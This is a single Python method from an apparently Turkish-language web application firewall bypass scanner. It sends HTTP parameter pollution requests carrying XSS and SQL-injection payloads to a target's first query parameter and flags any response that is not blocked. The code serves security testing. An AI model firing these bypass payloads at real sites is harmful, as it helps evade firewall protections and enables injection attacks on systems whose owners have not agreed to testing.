    def _test_http_param_pollution(self):
        """HTTP Parameter Pollution (HPP) bypass."""
        print(f"\n  {Colors.BLUE}[*] HTTP Parameter Pollution testleri...{Colors.RESET}")

        parsed = urlparse(self.target)
        if not parsed.query:
            return

        params = parse_qs(parsed.query)
        if not params:
            return

        first_param = list(params.keys())[0]

        hpp_payloads = [
            f"{first_param}=safe&{first_param}=<script>alert(1)</script>",
            f"{first_param}=safe&{first_param}=' OR '1'='1",
            f"{first_param}[]=<script>alert(1)</script>",
            f"{first_param}[0]=safe&{first_param}[1]=<script>alert(1)</script>",
        ]

        for payload_str in hpp_payloads:
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{payload_str}"
            resp = self._make_request(test_url)
            if resp and not self._is_blocked(resp):
                if "script" in resp.text.lower() or "alert" in resp.text.lower():
                    self._register_bypass(
                        "WAF HTTP Parameter Pollution Bypass",
                        "Parametre çoğaltma / dizi gösterimi ile WAF atlatıldı.",
                        payload_str,
                        f"HPP: {payload_str[:80]}",
                        resp.text,
                    )
                    return

